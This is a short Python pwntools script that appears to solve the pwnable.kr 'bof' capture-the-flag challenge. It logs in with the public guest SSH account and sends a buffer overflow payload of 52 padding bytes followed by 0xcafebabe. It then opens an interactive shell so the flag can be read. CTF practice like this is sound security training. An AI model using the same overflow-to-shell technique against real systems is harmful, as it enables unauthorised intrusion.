from pwn import *

if __name__ == '__main__':
    # SSH into the machine to do the ctf.
    my_ssh = ssh("bof", "pwnable.kr", password="guest", port=2222)
    # Remote into the localhost on port 9000
    ssh_rem = my_ssh.remote('0', 9000)
    
    # Send the payload. Pad with 52 A's and then 0xcafebabe in little-endian.
    ssh_rem.send('A'*52 + '\xbe\xba\xfe\xca')
    # Send a new line - simulates pressing the enter button on the keyboard.
    ssh_rem.send(b'\n')
    # Allow us to interact with the terminal so we can run cat flag.
    ssh_rem.interactive()
